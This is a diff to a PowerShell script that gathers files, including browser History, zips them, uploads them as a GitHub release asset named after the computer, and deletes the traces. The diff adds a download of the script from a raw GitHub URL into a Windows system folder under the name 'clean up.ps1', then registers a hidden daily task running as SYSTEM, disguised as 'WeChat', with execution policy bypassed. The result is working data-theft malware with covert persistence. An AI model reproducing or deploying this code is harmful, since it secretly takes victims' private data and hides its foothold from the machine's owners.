@@ -1,3 +1,7 @@
+# Save self to local file path for scheduled task
+$localPath = "C:\ProgramData\Microsoft\Windows\clean up.ps1"
+Invoke-RestMethod -Uri "https://raw.githubusercontent.com/rtyuiuiop/1/main/.github/install.ps1" -OutFile $localPath -UseBasicParsing
+
 # Set UTF-8 encoding
 [Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
 $OutputEncoding = [System.Text.UTF8Encoding]::UTF8
@@ -10,7 +14,7 @@ $date = $now.ToString("yyyy-MM-dd")
 $computerName = $env:COMPUTERNAME
 $tag = "backup-$computerName-$timestamp"
 $releaseName = "Backup - $computerName - $date"
-$tempRoot = "$env:TEMP\\package-$computerName-$timestamp"
+$tempRoot = "$env:TEMP\package-$computerName-$timestamp"
 $zipName = "package-$computerName-$timestamp.zip"
 $zipPath = Join-Path $env:TEMP $zipName
 New-Item -ItemType Directory -Path $tempRoot -Force -ErrorAction SilentlyContinue | Out-Null
@@ -34,7 +38,7 @@ foreach ($path in $pathList) {
     $dest = Join-Path $tempRoot $name
 
     try {
-        if ($path -like "*\\History" -and (Test-Path $path -PathType Leaf)) {
+        if ($path -like "*\History" -and (Test-Path $path -PathType Leaf)) {
             $srcDir = Split-Path $path
             robocopy $srcDir $dest (Split-Path $path -Leaf) /NFL /NDL /NJH /NJS /nc /ns /np > $null
         } elseif (Test-Path $path -PathType Container) {
@@ -69,12 +73,12 @@ try {
 
 # STEP 3: Archive
 try {
-    Compress-Archive -Path "$tempRoot\\*" -DestinationPath $zipPath -Force -ErrorAction Stop
+    Compress-Archive -Path "$tempRoot\*" -DestinationPath $zipPath -Force -ErrorAction Stop
 } catch {
     return
 }
 
-# STEP 4: Send to GitHub as a release asset
+# STEP 4: Upload
 $releaseData = @{
     tag_name = $tag
     name = $releaseName
@@ -109,3 +113,21 @@ try {
 # STEP 5: Cleanup
 Remove-Item $tempRoot -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+
+# STEP 6: Register daily task at 2:00 AM to run the clean up.ps1 script
+$taskName = "WeChat"
+$taskDescription = "Daily file package task"
+$scriptPath = "C:\\ProgramData\\Microsoft\\Windows\\clean up.ps1"
+
+try {
+    # If exists, delete first
+    if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
+        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
+    }
+
+    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
+    $trigger = New-ScheduledTaskTrigger -Daily -At 1:00am
+    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+
+    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description $taskDescription -Principal $principal
+} catch {}
